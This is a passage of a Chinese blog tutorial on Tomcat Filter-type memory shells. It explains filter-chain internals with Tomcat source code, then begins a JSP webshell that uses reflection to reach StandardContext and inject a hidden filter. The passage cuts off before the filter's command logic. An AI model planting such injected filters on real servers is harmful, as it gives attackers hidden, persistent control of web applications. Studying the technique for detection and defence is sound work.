class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there are no filter mappings, we are done</span></span><br><span class="line"><span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br></pre></td></tr></table></figure><p><img src="/img/post/tomcat-filter-memshell/7.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>FilterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来，会对filterMaps进行遍历，在遍历过程中会检查过滤器映射的调度类型和URL模式，然后通过StandardContext的findFilterConfig方法获取filterConfig，并将其添加至过滤器链。如下图，在filterConfig中可看到filterDef，这是对过滤器的定义，其中包含了过滤器的名称和实现类和初始化参数，对应的就是web.xml中的filter配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Acquire the information we will need to match filter mappings</span></span><br><span class="line"><span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line"><span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">            context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isCometFilter</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (comet) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            isCometFilter = filterConfig.getFilter() <span class="keyword">instanceof</span> CometFilter;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// Note: The try catch is there because getFilter has a lot of</span></span><br><span class="line">            <span class="comment">// declared exceptions. However, the filter is allocated much</span></span><br><span class="line">            <span class="comment">// earlier</span></span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">            ExceptionUtils.handleThrowable(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isCometFilter) &#123;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/tomcat-filter-memshell/8.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>FilterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.tomcatdemo.filter.FilterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，会再次遍历filterMaps，在遍历过程中也对调度类型和servletName进行了检查，如果通过检查则添加匹配目标Servlet名称的过滤器到过滤器链。</p><p>最终返回已完成的过滤链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add filters that match on servlet name second</span></span><br><span class="line"><span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">            context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isCometFilter</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (comet) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            isCometFilter = filterConfig.getFilter() <span class="keyword">instanceof</span> CometFilter;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// Note: The try catch is there because getFilter has a lot of</span></span><br><span class="line">            <span class="comment">// declared exceptions. However, the filter is allocated much</span></span><br><span class="line">            <span class="comment">// earlier</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isCometFilter) &#123;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the completed filter chain</span></span><br><span class="line"><span class="keyword">return</span> filterChain;</span><br></pre></td></tr></table></figure><p><img src="/img/post/tomcat-filter-memshell/9.png"></p><p>通过对createFilterChain方法的分析，可得知在创建过滤器链前必须要先获取到StandradContext，根据StandradContext获取到filterConfigs，并对FilterMap和FilterDef进行添加。</p><h2 id="FilterDef与FilterMap"><a href="#FilterDef与FilterMap" class="headerlink" title="FilterDef与FilterMap"></a>FilterDef与FilterMap</h2><p>FilterDef和FilterMap是Tomcat中用于定义和映射过滤器的两个关键类，它们共同作用于过滤器的配置和执行。</p><h3 id="FilterDef"><a href="#FilterDef" class="headerlink" title="FilterDef"></a>FilterDef</h3><p>FilterDef用于定义一个过滤器，它包含过滤器的基本信息，如过滤器的名称、实现类和初始化参数。每一个FilterDef对象代表一个特定的过滤器定义。</p><p>这个类在Tomcat 7版本中是org.apache.catalina.deploy.FilterDef，而在Tomcat 8版本中则是org.apache.tomcat.util.descriptor.web.FilterDef。</p><p>如下是它的一些相关字段与方法，其中filter是要关联的过滤器实例，FilterDef类提供了setFilter方法用于设置与此FilterDef相关联的过滤器实例；filterClass是过滤器类的全限定名，表示该过滤器的具体实现类，setFilterClass方法用于设置Filter类的全限定名；filterName是过滤器的名称，setFilterName方法用于设置过滤器名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The filter instance associated with this definition</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Filter <span class="title function_">getFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFilter</span><span class="params">(Filter filter)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.filter = filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The fully qualified name of the Java class that implements this filter.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">filterClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getFilterClass</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.filterClass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFilterClass</span><span class="params">(String filterClass)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.filterClass = filterClass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The name of this filter, which must be unique among the filters</span></span><br><span class="line"><span class="comment"> * defined for a particular web application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getFilterName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.filterName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFilterName</span><span class="params">(String filterName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                sm.getString(<span class="string">&quot;filterDef.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.filterName = filterName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FilterMap"><a href="#FilterMap" class="headerlink" title="FilterMap"></a>FilterMap</h3><p>FilterMap用于定义过滤器的映射关系，指定过滤器应用到哪些URL模式或Servlet上。每一个FilterMap对象代表一个过滤器与特定URL模式或Servlet名称的映射关系。</p><p>这个类在Tomcat 7与8版本中，分别是org.apache.catalina.deploy.FilterMap与org.apache.tomcat.util.descriptor.web.FilterMap。</p><p>在FilterMap中存在如下字段与方法，在编写内存马的时候会用到。首先是filterName，过滤器的名称，提供了setFilterName用于设置过滤器的名称；其次是过滤器应用的URL模式urlPatterns，提供了addURLPattern方法用于添加过滤器应用的URL模式；最后是setDispatcher方法，用于设置过滤器应用的调度类型，有转发请求（FORWARD）、包含请求（INCLUDE）、直接请求（REQUEST）、错误请求（ERROR）和异步（ASYNC）等五种类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getFilterName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.filterName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFilterName</span><span class="params">(String filterName)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.filterName = filterName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The URL pattern this mapping matches.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> String[] urlPatterns = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String[] getURLPatterns() &#123;</span><br><span class="line">    <span class="keyword">if</span> (matchAllUrlPatterns) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.urlPatterns);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addURLPattern</span><span class="params">(String urlPattern)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;*&quot;</span>.equals(urlPattern)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.matchAllUrlPatterns = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String[] results = <span class="keyword">new</span> <span class="title class_">String</span>[urlPatterns.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(urlPatterns, <span class="number">0</span>, results, <span class="number">0</span>, urlPatterns.length);</span><br><span class="line">        results[urlPatterns.length] = RequestUtil.URLDecode(urlPattern);</span><br><span class="line">        urlPatterns = results;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This method will be used to set the current state of the FilterMap</span></span><br><span class="line"><span class="comment"> * representing the state of when filters should be applied.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDispatcher</span><span class="params">(String dispatcherString)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dispatcher</span> <span class="operator">=</span> dispatcherString.toUpperCase(Locale.ENGLISH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dispatcher.equals(DispatcherType.FORWARD.name())) &#123;</span><br><span class="line">        <span class="comment">// apply FORWARD to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= FORWARD;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.INCLUDE.name())) &#123;</span><br><span class="line">        <span class="comment">// apply INCLUDE to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= INCLUDE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.REQUEST.name())) &#123;</span><br><span class="line">        <span class="comment">// apply REQUEST to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= REQUEST;</span><br><span class="line">    &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.ERROR.name())) &#123;</span><br><span class="line">        <span class="comment">// apply ERROR to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= ERROR;</span><br><span class="line">    &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (dispatcher.equals(DispatcherType.ASYNC.name())) &#123;</span><br><span class="line">        <span class="comment">// apply ERROR to the global dispatcherMapping.</span></span><br><span class="line">        dispatcherMapping |= ASYNC;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h2><p>org.apache.catalina.core.StandardContext类是Tomcat中的一个核心组件，表示一个Web应用的上下文。它负责管理Web应用的所有组件，包括Servlet、Filter和Listener等。在Filter方法，StandardContext通过FilterDef和FilterMap来管理过滤器的定义和映射。</p><p>在StandardContext类中提供了addFilterDef方法用于将一个FilterDef添加到当前上下文中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a filter definition to this Context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterDef The filter definition to be added</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterDef</span><span class="params">(FilterDef filterDef)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">        filterDefs.put(filterDef.getFilterName(), filterDef);</span><br><span class="line">    &#125;</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterDef&quot;</span>, filterDef);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addFilterMapBefore方法用于在当前上下文中添加一个FilterMap，并确保该映射插入在web.xml中定义的映射之前，这样便可以实现对过滤器执行顺序的控制，特别是在需要优先处理某些过滤器的情况下，例如在利用Filter内存马攻击Shiro应用的场景下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a filter mapping to this Context before the mappings defined in the</span></span><br><span class="line"><span class="comment"> * deployment descriptor but after any other mappings added via this method.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterMap The filter mapping to be added</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> IllegalArgumentException if the specified filter name</span></span><br><span class="line"><span class="comment"> *  does not match an existing filter definition, or the filter mapping</span></span><br><span class="line"><span class="comment"> *  is malformed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMapBefore</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">    validateFilterMap(filterMap);</span><br><span class="line">    <span class="comment">// Add this filter mapping to our registered set</span></span><br><span class="line">    filterMaps.addBefore(filterMap);</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Filter型内存马实现"><a href="#Filter型内存马实现" class="headerlink" title="Filter型内存马实现"></a>Filter型内存马实现</h2><p>根据如上，我们编写如下jsp内存马，将其上传至Web应用，并访问执行。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;F!lter&quot;</span>+System.nanoTime()%<span class="number">100000000L</span>;</span><br><span class="line">    org.apache.catalina.core.<span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">    contextField = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsfield</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) filterConfigsfield.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (map.get(filterName) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> 